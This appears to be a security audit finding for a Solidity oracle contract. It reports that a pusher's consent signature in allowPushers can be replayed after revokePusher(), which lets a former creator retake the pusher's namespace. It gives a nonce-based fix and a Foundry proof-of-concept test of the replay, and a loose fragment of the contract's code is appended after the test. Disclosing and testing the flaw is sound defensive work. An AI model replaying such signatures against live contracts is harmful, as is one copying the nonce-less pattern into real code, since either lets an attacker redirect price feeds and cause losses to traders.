### Title
Pusher Consent Signature Replay Nullifies `revokePusher()` and Enables Namespace Hijack After Revocation — (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

---

### Summary

`allowPushers` in `CompressedOracleV1` does not invalidate or consume a pusher's consent signature upon revocation. A creator who holds a valid, non-expired signature can replay it an unlimited number of times before the deadline, re-establishing `namespaceRemapping[pusher]` immediately after the pusher calls `revokePusher()`. This makes self-revocation ineffective for the entire lifetime of the signed deadline and allows the creator to overwrite a subsequent delegation to a different creator, silently redirecting the pusher's price writes away from the intended namespace and into the attacker's namespace, causing stale prices in the victim creator's pools.

---

### Finding Description

`allowPushers` verifies the pusher's EIP-191 signature over `(block.chainid, address(this), deadline, pusher, msg.sender)` and unconditionally writes `namespaceRemapping[pusher] = msg.sender`:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;   // no nonce, no used-sig check
```

There is no nonce, no used-signature bitmap, and no state that is invalidated when `revokePusher()` clears the mapping:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);   // cleared, but sig still valid
    emit PusherRevoked(msg.sender, creator);
}
```

The code comment in `allowPushers` acknowledges the risk ("an undated signature could re-establish a delegation AFTER the pusher revoked it") and cites the deadline as the mitigation. However, the deadline is chosen by the **creator** (`msg.sender`), not the pusher. The pusher signs over the deadline value, but has no way to enforce a short deadline — the creator can present any deadline the pusher was willing to sign. A pusher who signed a consent with `deadline = block.timestamp + 365 days` cannot effectively revoke for a full year.

Additionally, `allowPushers` does not check whether `namespaceRemapping[pusher]` is already set to a different creator. This means a creator holding an old signature can overwrite a subsequent delegation:

1. Pusher P signs consent for creatorA with deadline T (far future).
2. CreatorA calls `allowPushers(T, [P], [sigA])` → `namespaceRemapping[P] = creatorA`.
3. Pusher P calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
4. Pusher P signs a new consent for creatorB; creatorB calls `allowPushers(T2, [P], [sigB])` → `namespaceRemapping[P] = creatorB`.
5. CreatorA replays the old signature: `allowPushers(T, [P], [sigA])` → `namespaceRemapping[P] = creatorA` (overwrites creatorB's delegation).
6. All subsequent fallback pushes from P land in creatorA's namespace instead of creatorB's.

---

### Impact Explanation

- **CreatorB's pools receive no new price updates** from pusher P. The `fallback` push path resolves the namespace at call time from `namespaceRemapping[msg.sender]`, so every push P makes goes to creatorA's namespace. CreatorB's feeds remain at their last-written timestamp, which every consumer will eventually reject as stale.
- **Stale bid/ask quotes reach pool swaps**: pools backed by creatorB's feeds will either revert on the timestamp check or execute at an outdated price, causing loss to traders or LPs.
- **CreatorA's pools receive price data intended for a different asset**: if P was pushing ETH/USD data for creatorB's ETH pool but creatorA's namespace is used for a BTC pool, the wrong price feeds into live swaps.

---

### Likelihood Explanation

- The trigger requires creatorA to hold a valid, non-expired signature from the pusher — a normal precondition for any creator who has previously established a delegation.
- The replay call is a standard public transaction with no special privilege; creatorA only needs to watch for `PusherRevoked` events and respond in the same block or shortly after.
- Pushers routinely sign consents with multi-day or multi-week deadlines (as shown in the test suite using `block.timestamp + 1 days`), giving the creator a wide replay window.
- Likelihood is **medium**: requires a motivated creator and a pusher who attempts to switch namespaces, but no privileged access or malicious setup beyond holding the original signature.

---

### Recommendation

Include a per-pusher revocation nonce in the signed data and increment it on every `revokePusher()` or `removePushers()` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]   // <-- add nonce
    ))
);

// In revokePusher / removePushers:
pusherNonce[pusher]++;   // invalidates all prior signatures
namespaceRemapping[pusher] = address(0);
```

This ensures that any signature issued before the most recent revocation is cryptographically invalid for future `allowPushers` calls, making `revokePusher()` immediately and permanently effective.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayAfterRevokePoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY  = 0xBEEF;
    uint256 constant CREATOR_B_KEY = 0xCAFE;

    address pusher;
    address creatorA;
    address creatorB;

    function setUp() public {
        oracle   = new CompressedOracleV1(address(this), 0);
        pusher   = vm.addr(PUSHER_KEY);
        creatorA = address(0xAAAA);
        creatorB = vm.addr(CREATOR_B_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayNullifiesRevoke() public {
        uint256 deadline = block.timestamp + 365 days;

        // 1. Pusher signs consent for creatorA
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creatorA))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sigA = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sigA;

        // 2. CreatorA establishes delegation
        vm.prank(creatorA);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorA);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // 4. Pusher delegates to creatorB
        uint256 deadline2 = block.timestamp + 1 days;
        bytes32 digest2 = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline2, pusher, creatorB))
        );
        (v, r, s) = vm.sign(PUSHER_KEY, digest2);
        sigs[0] = abi.encodePacked(r, s, v);
        vm.prank(creatorB);
        oracle.allowPushers(deadline2, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorB);

        // 5. CreatorA replays OLD signature — overwrites creatorB's delegation
        sigs[0] = sigA;
        vm.prank(creatorA);
        oracle.allowPushers(deadline, pushers, sigs);

        // Delegation is now back to creatorA — revoke and creatorB delegation both nullified
        assertEq(oracle.namespaceRemapping(pusher), creatorA,
            "creatorA hijacked namespace via replay");

        // 6. Pusher's fallback pushes now land in creatorA's namespace, not creatorB's
        // CreatorB's pools will receive no further price updates → stale prices
    }
}

    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
